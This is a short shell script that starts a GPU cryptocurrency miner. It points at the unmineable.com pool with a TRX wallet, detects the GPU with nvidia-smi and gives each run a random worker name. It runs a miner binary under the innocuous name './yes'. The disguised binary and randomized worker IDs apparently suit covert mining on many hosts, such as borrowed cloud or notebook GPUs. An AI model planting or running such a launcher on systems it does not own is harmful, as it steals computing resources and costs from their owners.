POOL=rx-us.unmineable.com:3333
WALLET=TRX:TEb4pN4GoYJ8ynXVa1Po61FiiwqmxmAaN1
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo d6PXR9yf-$(shuf -i 1911-389511 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
